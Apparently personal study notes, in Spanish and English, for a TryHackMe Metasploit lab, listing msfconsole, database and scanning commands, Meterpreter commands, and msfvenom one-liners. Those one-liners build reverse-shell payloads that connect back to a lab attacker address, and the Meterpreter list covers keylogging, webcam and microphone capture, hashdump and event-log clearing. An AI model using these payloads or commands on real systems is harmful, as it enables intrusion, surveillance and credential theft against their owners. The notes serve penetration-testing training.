# Metasploit Framework

## Conceptos Básicos

Antes de explorar los módulos, es útil entender algunos conceptos clave:

- **Vulnerabilidad**: Un fallo de diseño, código o lógica en el sistema objetivo. La explotación de una vulnerabilidad puede resultar en la divulgación de información confidencial o en la ejecución de código en el sistema objetivo.
- **Exploit**: Código que aprovecha una vulnerabilidad en el sistema objetivo.
- **Payload**: El código que se ejecutará en el sistema objetivo tras la explotación de una vulnerabilidad, como ganar acceso al sistema o leer información confidencial.

---

## Módulos en Metasploit

1. **Auxiliary**: Complementa el proceso de explotación, incluyendo escaneos y ataques de fuerza bruta.
2. **Encoders**: Codifica el payload para evitar ser detectado por software de seguridad.
3. **Evasion**: Ayuda a evadir las defensas del sistema objetivo.
4. **Exploits**: Código que aprovecha una vulnerabilidad en el sistema objetivo.
5. **NOPs**: Instrucciones "No Operation" que llenan espacio y alinean el exploit.
6. **Payloads**: Existen varios tipos de payloads:
   - **Adapters**: Envolven payloads en diferentes formatos, como comandos de PowerShell.
   - **Singles**: Payloads independientes que no necesitan descargar componentes adicionales (por ejemplo, agregar un usuario o lanzar una aplicación).
   - **Stagers**: Establecen un canal de comunicación entre Metasploit y el sistema objetivo, permitiendo enviar payloads en etapas. El tamaño del payload inicial es más pequeño, lo cual ayuda a evitar la detección.
   - **Stages**: Payloads de mayor tamaño que se descargan y ejecutan tras establecerse la conexión inicial mediante el stager.
7. **Post**: Módulos utilizados después de la explotación para realizar acciones en el sistema comprometido.

![Metasploit Modules](https://github.com/MC-19/Upgrade-Hub/blob/main/TryHackMe/Rooms/a88c8d37283878e01447853a68578deb.png)


## Tipos de Prompts en Metasploit

Al trabajar con Metasploit, es importante entender los diferentes tipos de prompts que encontrarás:

1. **Command Prompt Regular**: 
   - No puedes usar comandos de Metasploit aquí. Es el terminal estándar del sistema operativo.

2. **msfconsole Prompt**: 
   - Aparece como `msf6` (o `msf5` dependiendo de la versión instalada). En este prompt, no se establece un contexto específico, por lo que no puedes usar comandos específicos para establecer parámetros y ejecutar módulos.

3. **Context Prompt**: 
   - Una vez que decides usar un módulo y ejecutas el comando `set` para seleccionarlo, el prompt de `msfconsole` mostrará el contexto. Aquí puedes usar comandos específicos del contexto (por ejemplo, `set RHOSTS 10.10.x.x`).

4. **Meterpreter Prompt**: 
   - Meterpreter es un payload importante que se verá en detalle más adelante. Este prompt significa que un agente de Meterpreter se ha cargado en el sistema objetivo y se ha conectado de regreso a ti. Puedes usar comandos específicos de Meterpreter aquí.

5. **Shell en el Sistema Objetivo**: 
   - Una vez que se completa la explotación, puedes tener acceso a un shell de comandos en el sistema objetivo. Este es un comando regular, y todos los comandos escritos aquí se ejecutan en el sistema objetivo.


# Main Commands

- **`use`**: Selects a module to work with.
  - Example: `use exploit/windows/smb/ms17_010_eternalblue`

- **`show options`**: Displays all the available parameters for the selected module.

- **`back`**: Returns to the previous menu or prompt.

- **`info`**: Provides detailed information about the current module.

- **`search`**: Finds a specific module based on a keyword.
  - Example: `use 0` (can use the number from search results)

- **`set`**: Sets a parameter for the module.
  - Example: `set RHOSTS 10.10.x.x`

- **`show options`**: Lists all required and optional parameters for the current module.

- **`unset`**: Clears a specific parameter value.

- **`unset all`**: Clears all set parameters for the current module.

- **`setg`**: Sets a global parameter, applicable to all modules.
  - Example: `setg RHOSTS 10.10.x.x`

- **`unsetg`**: Clears a global parameter.

- **`exploit`**: Runs the exploit module.

- **`run`**: Alias for `exploit`, used when executing non-exploit modules.

- **`exploit -z`**: Executes the exploit and sends the session to the background immediately.

- **`check`**: Verifies if the target system is vulnerable without exploiting it.

- **`background`**: Sends the active session to the background.

- **`CTRL+Z`**: Shortcut to background the current session.

- **`sessions`**: Lists all active sessions.

- **`sessions -i <session_number>`**: Interacts with a specific session based on its ID.




# Comandos y Explicaciones

1. **`search portscan`**
   - Lista los módulos de escaneo de puertos disponibles en Metasploit.

2. **`set CONCURRENCY <valor>`**
   - Establece el número de objetivos que se escanearán simultáneamente.

3. **`set PORTS <rango>`**
   - Define el rango de puertos a escanear (ej. `1-10000`).

4. **`set RHOSTS <objetivo>`**
   - Especifica el objetivo o la red objetivo a escanear.

5. **`set THREADS <valor>`**
   - Establece el número de hilos que se utilizarán simultáneamente para acelerar el escaneo.

6. **`scanner/discovery/udp_sweep`**
   - Módulo que permite identificar rápidamente servicios que se ejecutan sobre UDP.

7. **`smb_enumshares`**
   - Módulo que permite enumerar los recursos compartidos en un sistema SMB.

8. **`systemctl start postgresql`**
   - Inicia la base de datos PostgreSQL que utiliza Metasploit.

9. **`msfdb init`**
   - Inicializa la base de datos de Metasploit.

10. **`msfconsole`**
    - Inicia la consola de Metasploit.

11. **`db_status`**
    - Verifica el estado de la base de datos en Metasploit.

12. **`workspace`**
    - Lista los espacios de trabajo disponibles.

13. **`workspace -a <nombre>`**
    - Agrega un nuevo espacio de trabajo.

14. **`workspace -d <nombre>`**
    - Elimina un espacio de trabajo existente.

15. **`db_nmap <objetivo>`**
    - Realiza un escaneo Nmap y guarda los resultados en la base de datos de Metasploit.

16. **`hosts`**
    - Muestra información sobre los hosts almacenados en la base de datos.

17. **`services`**
    - Muestra información sobre los servicios en los hosts almacenados.

18. **`hosts -R`**
    - Añade la información del host a los parámetros de RHOSTS.

19. **`use auxiliary/scanner/smb/smb_ms17_010`**
    - Utiliza el módulo de escaneo de vulnerabilidades MS17-010.

20. **`show options`**
    - Muestra las opciones configuradas para el módulo activo.

21. **`run` o `exploit`**
    - Lanza el exploit o ejecuta el módulo activo.
   
22. **`info`
    - You can use the info command for any module to have a better understanding of its use and purpose.

22. **`vnc_login`
    - can help us find login details for the VNC service.

23. **`Msfvenom`
    - allows you to generate payloads.
   
24. **`msfvenom --list formats`
    - You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python).

25. **`Linux Executable and Linkable Forma`
    - `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
   
26. **`Windows`
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`

27. **`PHP`
    - `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`

28. **`ASP`
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`

29. **`Python`
    - `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`

Typing help on any Meterpreter session (shown by meterpreter> at the prompt) will list all available commands.



# Meterpreter Help Menu

## Core Commands

| Command      | Description                                   |
|--------------|-----------------------------------------------|
| `?`          | Help menu                                    |
| `background` | Backgrounds the current session              |
| `bg`         | Alias for background                         |
| `bgkill`     | Kills a background meterpreter script        |
| `bglist`     | Lists running background scripts             |
| `bgrun`      | Executes a meterpreter script as a background thread |
| `channel`    | Displays information or control active channels |
| `close`      | Closes a channel                             |

> Each version of Meterpreter has unique command options, so running the `help` command is recommended for the latest list of commands available in that session.

Meterpreter organizes tools into three main categories:

1. **Built-in Commands**
2. **Meterpreter Tools**
3. **Meterpreter Scripting**

Commands are further organized by functionality:

- **Core Commands**
- **File System Commands**
- **Networking Commands**
- **System Commands**
- **User Interface Commands**
- **Webcam Commands**
- **Audio Output Commands**
- **Privilege Escalation (Elevate) Commands**
- **Password Database Commands**
- **Timestomp Commands**

**Note**: The list provided here was generated from the `help` output of the Windows Meterpreter version (windows/x64/meterpreter/reverse_tcp). Other versions may vary.

---

## Common Meterpreter Commands

### Core Commands

- **`background`**: Backgrounds the current session.
- **`exit`**: Terminates the Meterpreter session.
- **`guid`**: Retrieves the session GUID (Globally Unique Identifier).
- **`help`**: Displays the help menu.
- **`info`**: Displays information about a Post module.
- **`irb`**: Opens an interactive Ruby shell on the current session.
- **`load`**: Loads one or more Meterpreter extensions.
- **`migrate`**: Migrates Meterpreter to another process.
- **`run`**: Executes a Meterpreter script or Post module.
- **`sessions`**: Quickly switch to another session.

---

### File System Commands

- **`cd`**: Changes directory.
- **`ls`**: Lists files in the current directory (`dir` also works).
- **`pwd`**: Prints the current working directory.
- **`edit`**: Allows editing a file.
- **`cat`**: Displays the contents of a file.
- **`rm`**: Deletes the specified file.
- **`search`**: Searches for files.
- **`upload`**: Uploads a file or directory.
- **`download`**: Downloads a file or directory.

---

### Networking Commands

- **`arp`**: Displays the host ARP (Address Resolution Protocol) cache.
- **`ifconfig`**: Shows network interfaces on the target system.
- **`netstat`**: Shows the network connections.
- **`portfwd`**: Forwards a local port to a remote service.
- **`route`**: Views and modifies the routing table.

---

### System Commands

- **`clearev`**: Clears the event logs.
- **`execute`**: Executes a command.
- **`getpid`**: Shows the current process ID.
- **`getuid`**: Shows the user that Meterpreter is running as.
- **`kill`**: Terminates a process.
- **`pkill`**: Terminates processes by name.
- **`ps`**: Lists running processes.
- **`reboot`**: Reboots the remote computer.
- **`shell`**: Drops into a system command shell.
- **`shutdown`**: Shuts down the remote computer.
- **`sysinfo`**: Gets information about the remote system, such as OS.

---

### Other Commands

- **`idletime`**: Returns the number of seconds the remote user has been idle.
- **`keyscan_dump`**: Dumps the keystroke buffer.
- **`keyscan_start`**: Starts capturing keystrokes.
- **`keyscan_stop`**: Stops capturing keystrokes.
- **`screenshare`**: Watches the remote user's desktop in real-time.
- **`screenshot`**: Captures a screenshot of the interactive desktop.
- **`record_mic`**: Records audio from the default microphone for a specified time.
- **`webcam_chat`**: Initiates a video chat.
- **`webcam_list`**: Lists available webcams.
- **`webcam_snap`**: Takes a snapshot from a specified webcam.
- **`webcam_stream`**: Streams video from a specified webcam.
- **`getsystem`**: Attempts to elevate privileges to local system level.
- **`hashdump`**: Dumps the contents of the SAM database.

---

This file offers a quick reference to commonly used Meterpreter commands. For a comprehensive list, always use the `help` command in your active session.


